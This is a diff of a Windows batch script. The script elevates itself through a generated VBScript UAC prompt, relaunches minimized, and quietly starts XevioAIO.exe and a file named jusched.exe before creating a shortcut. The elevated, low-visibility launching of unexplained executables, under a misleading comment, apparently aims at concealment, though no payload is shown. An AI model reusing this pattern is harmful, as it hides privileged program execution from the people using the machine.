@@ -1,6 +1,12 @@
 @echo off
 :: BatchGotAdmin
 
+REM Relaunch the script minimized if not already minimized
+if "%1" neq "minimized" (
+    start /min "" "%~dpnx0" minimized %*
+    exit /b
+)
+
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
@@ -14,8 +20,8 @@ if '%errorlevel%' NEQ '0' (
 
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"=""
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    set params=%*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 minimized %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
 
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
@@ -44,13 +50,13 @@ if '%errorlevel%' NEQ '0' (
     )
 
     REM --> Execute CritScript.exe silently
-    start /B "" XevioAIO.exe >nul 2>&1
+    start /min "" XevioAIO.exe >nul 2>&1
     timeout /t 5 /nobreak >nul 2>&1
 
     REM --> Check and run JUSCHED.EXE if it exists
     for %%F in (jusched.exe JUSCHED.EXE) do (
         if exist "%%F" (
-            start /B "" %%F >nul 2>&1
+            start /min "" %%F >nul 2>&1
             timeout /t 5 /nobreak >nul 2>&1
             goto :CreateShortcut
         )
